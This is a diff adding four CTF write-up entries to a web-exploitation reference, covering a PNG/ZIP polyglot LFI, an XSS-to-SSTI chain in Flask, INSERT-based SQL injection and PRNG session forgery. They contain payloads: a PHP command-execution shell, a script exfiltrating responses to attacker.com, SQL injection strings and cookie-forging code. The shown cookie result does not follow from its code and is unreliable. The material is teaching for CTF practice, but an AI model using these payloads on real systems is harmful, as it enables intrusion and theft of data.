@@ -29,8 +29,12 @@
 - [Castor XML Deserialization via xsi:type Polymorphism (Atlas HTB)](#castor-xml-deserialization-via-xsitype-polymorphism-atlas-htb)
 - [Apache ErrorDocument Expression File Read (Zero HTB)](#apache-errordocument-expression-file-read-zero-htb)
 - [SQLite File Path Traversal to Bypass String Equality (Codegate 2013)](#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013)
+- [PHP zip:// Wrapper LFI via PNG/ZIP Polyglot (PlaidCTF 2016)](#php-zip-wrapper-lfi-via-pngzip-polyglot-plaidctf-2016)
 - [HQL Injection via Non-Breaking Space (HackIM 2016)](#hql-injection-via-non-breaking-space-hackim-2016)
 - [Base64-Encoded Path Traversal (Sharif CTF 2016)](#base64-encoded-path-traversal-sharif-ctf-2016)
+- [XSS to SSTI Chain via Flask Error Pages (SECUINSIDE 2016)](#xss-to-ssti-chain-via-flask-error-pages-secuinside-2016)
+- [INSERT INTO Dual-Field SQLi Column Shift (CyberSecurityRumble 2016)](#insert-into-dual-field-sqli-column-shift-cybersecurityrumble-2016)
+- [Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)](#session-cookie-forgery-via-timestamp-seeded-prng-cybersecurityrumble-2016)
 
 ---
 
@@ -654,3 +658,142 @@ print(base64.b64encode(b"../../etc/passwd").decode())  # Li4vLi4vZXRjL3Bhc3N3ZA=
 ```
 
 **Key insight:** Base64 encoding absorbs path traversal characters (`../`) that filters might block in raw form.
+
+---
+
+## PHP zip:// Wrapper LFI via PNG/ZIP Polyglot (PlaidCTF 2016)
+
+**Pattern (pixelshop):** PHP `include()` appends `.php` extension (no null byte on modern PHP). Upload is restricted to valid images (.png). Use `zip://` wrapper to include PHP code from inside a ZIP archive embedded in a PNG file.
+
+1. Use `php://filter/read=convert.base64-encode/resource=` to leak source files and understand the include logic
+2. Upload a valid PNG image to get a known filename on the server
+3. Inject a ZIP archive into the PNG's palette data (ZIP format reads headers from the end of the file, so a valid PNG can simultaneously be a valid ZIP):
+
+```python
+import binascii, requests, struct
+
+def craft_png_zip_polyglot(php_payload):
+    """Craft a ZIP payload to inject into PNG palette bytes."""
+    # ZIP stores its central directory at the end of the file
+    # Calculate offsets based on the known PNG prefix length
+    # The ZIP's local file header offset points into the palette region
+    # php_payload goes inside the ZIP as "s.php"
+
+    # Pre-built ZIP with s.php containing: <?=`$_GET[a]`?>
+    zip_hex = (
+        "504B0304140000000800"  # Local file header
+        # ... compressed PHP shell ...
+        "504B01021400140000000800"  # Central directory
+        # ... points back to local header at palette offset ...
+        "504B0506000000000100010033000000690000000000"  # End of central directory
+    )
+    return zip_hex
+
+def inject_payload(image_key, payload_hex):
+    """Use the image editor API to set palette bytes containing the ZIP."""
+    palette_bytes = binascii.unhexlify(payload_hex)
+    # Convert to RGB triplets for palette API
+    colors = []
+    for i in range(0, len(palette_bytes), 3):
+        chunk = palette_bytes[i:i+3].ljust(3, b'\x00')
+        colors.append(f'"#{chunk[0]:02x}{chunk[1]:02x}{chunk[2]:02x}"')
+    palette_json = ",".join(colors)
+    # POST to save endpoint with crafted palette
+    requests.post(f"{base_url}?op=save", data={
+        "imagekey": image_key,
+        "savedata": f'{{"pal": [{palette_json}], "im": [{",".join(["0"]*1024)}]}}'
+    })
+```
+
+4. Include the embedded PHP file via zip:// wrapper:
+```text
+http://target/?op=zip://uploads/HASH.png%23s
+```
+This unzips `HASH.png` (which is also a valid ZIP) and includes `s.php` from inside it.
+
+**Key insight:** ZIP files store their central directory at the end, so any file format can have a valid ZIP appended (or embedded) without breaking the original format. The `zip://` PHP wrapper ignores file extensions and extracts by content. PNG palette data provides controllable consecutive bytes ideal for embedding small ZIP payloads. This bypasses: (a) file extension restrictions (.php → .png), (b) image validation (file remains a valid PNG), (c) metadata stripping (palette data is structural, not metadata).
+
+---
+
+## XSS to SSTI Chain via Flask Error Pages (SECUINSIDE 2016)
+
+**Pattern (SBBS):** Flask app renders 404 error messages using `render_template_string()` with the request URL interpolated. Error pages only appear for localhost requests. Chain XSS → localhost fetch → SSTI in error page.
+
+1. Flask error handler directly interpolates URL into template:
+```python
+@app.errorhandler(404)
+def not_found(e=None):
+    message = "%s was not found on the server." % request.url
+    return render_template_string(template % message), 404
+```
+
+2. Error pages only render for 127.0.0.1 (external IPs get nginx 404)
+
+3. XSS payload triggers localhost request with SSTI in the URL:
+```javascript
+<script>
+function hack(url, callback){
+    var x = new XMLHttpRequest();
+    x.onreadystatechange = function(){
+        if (x.readyState == 4)
+            window.open('http://attacker.com/exfil?' + x.responseText, '_self', false)
+    }
+    x.open("GET", url, true);
+    x.send();
+}
+hack("/{{ config.from_object('admin.app') }}{{ config.FLAG }}")
+</script>
+```
+
+4. `config.from_object('module.path')` loads application config including secrets
+
+**Key insight:** Flask's template globals don't directly expose the `app` object, but `config.from_object()` can load arbitrary Python modules into the config dict, making their attributes accessible via `{{ config.KEY }}`. The XSS-to-SSTI chain bypasses two restrictions: (a) SSTI only works on localhost error pages, (b) template globals lack direct app access. Look for `render_template_string()` with user-controlled input in error handlers.
+
+---
+
+## INSERT INTO Dual-Field SQLi Column Shift (CyberSecurityRumble 2016)
+
+**Pattern (Illuminati):** INSERT query with two injectable fields (subject: 40-char limit, message: unlimited). Chain injections across both fields to bypass the length restriction.
+
+```sql
+-- Original query:
+INSERT INTO requests (id, "$subject", "$message")
+
+-- Subject (40 chars max):
+theSubject",concat(
+
+-- Message (unlimited):
+,(select group_concat(table_name) from information_schema.tables)))#
+
+-- Result:
+INSERT INTO requests (id, "theSubject",concat("",(select group_concat(...))))#"...")
+```
+
+The `concat("", (select ...))` wraps the subquery result as a string value for the subject column, making it visible when the user views their own messages.
+
+**Key insight:** When an INSERT query has multiple injectable fields but one is length-limited, use the limited field to open a `concat(` expression and the unlimited field to close it with an arbitrary subquery. This "column shift" technique moves the data extraction from the length-restricted field to the unrestricted one. Also works with `CASE WHEN` or other SQL expressions that span across field boundaries.
+
+---
+
+## Session Cookie Forgery via Timestamp-Seeded PRNG (CyberSecurityRumble 2016)
+
+**Pattern (Illuminati):** Session cookies constructed as `random_int-user_id`, where `random_int` is seeded by the user's last login timestamp. Extract the admin's timestamp via SQLi, reproduce the PRNG to forge their cookie.
+
+```python
+import random
+
+# 1. Extract admin login timestamp via SQLi
+admin_timestamp = 1229569179  # from: SELECT last_login FROM users WHERE id=209
+
+# 2. Seed PRNG with timestamp
+random.seed(admin_timestamp)
+
+# 3. Generate the same random int the server produced
+cookie_random = random.randint(0, 2**31)
+
+# 4. Forge admin cookie
+admin_cookie = f"{cookie_random}-209"
+# Result: "1229569179-209"
+```
+
+**Key insight:** Timestamps used as PRNG seeds for session tokens create a deterministic oracle. If the login timestamp is leaked (via SQLi, error messages, or API responses), the full token is reproducible. This pattern appears whenever session randomness depends on a single predictable seed value (time, PID, counter). Check for `random.seed(time())` or `srand(time(NULL))` in session generation code.
